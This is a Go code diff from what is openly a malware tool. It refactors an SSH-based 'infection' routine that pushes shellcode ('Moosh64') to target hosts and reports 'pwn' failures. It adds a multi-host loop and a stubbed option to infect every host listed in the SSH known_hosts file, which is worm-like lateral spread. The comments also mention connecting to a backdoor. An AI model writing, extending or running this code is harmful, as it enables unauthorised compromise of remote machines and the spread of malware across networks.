@@ -68,7 +68,6 @@ func NewSSHRunner(c SSHConfig) (*SSHRunner, error) {
 		auth = append(auth, ssh.PublicKeys(key))
 	}
 
-	fmt.Println(auth)
 	cl, err := ssh.Dial("tcp", c.Addr, &ssh.ClientConfig{
 		Auth:            auth,
 		User:            c.Username,
@@ -110,13 +109,19 @@ func main() {
 	addr := flag.String("addr", "", "The lucky guy")
 	agent := flag.Bool("agent", false, "Whether or not to use SSH agent")
 	arch := flag.String("arch", "x64", "Bitness of the system, (x64 or x86)")
-	ssh := flag.Bool("ssh", false, "Use SSH for the infection")
+	useSSH := flag.Bool("ssh", false, "Use SSH for the infection")
 	user := flag.String("user", "averagejoe", "Username to connect as(e.g. for SSH)")
+	known := flag.Bool("known", false, "Whether or not to try to infect all hosts in SSH known_hosts file")
 	flag.Parse()
 
-	if *arch != "x86" && *arch != "x64" || *addr == "" {
+	if *arch != "x86" && *arch != "x64" || *addr == "" && !*known {
 		flag.Usage()
 		os.Exit(1)
+	}
+
+	if *known {
+		// TODO: remove
+		log.Fatalf("known_hosts infection is not implented yet")
 	}
 
 	b := Moosh64
@@ -125,18 +130,31 @@ func main() {
 	}
 
 	switch {
-	case *ssh:
-		r, err := NewSSHRunner(SSHConfig{
-			Addr:     *addr,
-			UseAgent: *agent,
-			Username: *user,
-		})
-		if err != nil {
-			log.Fatalf("Failed to initialize SSH connection: %s", err)
+	case *useSSH:
+		var addrs []string
+		if *addr != "" {
+			addrs = append(addrs, *addr)
 		}
 
-		if err = r.RunShellCode(b); err != nil {
-			log.Fatalf("Failed to pwn %s: %s", *addr, err)
+		//ssh.ParseKnownHosts() // TODO: implement
+
+		if len(addrs) == 0 {
+			log.Fatalf("No hosts to infect")
+		}
+
+		for _, a := range addrs {
+			r, err := NewSSHRunner(SSHConfig{
+				Addr:     a,
+				UseAgent: *agent,
+				Username: *user,
+			})
+			if err != nil {
+				log.Fatalf("Failed to initialize SSH connection: %s", err)
+			}
+
+			if err = r.RunShellCode(b); err != nil {
+				log.Fatalf("Failed to pwn %s: %s", *addr, err)
+			}
 		}
 	default:
 		// TODO: attempt to connect to the backdoor
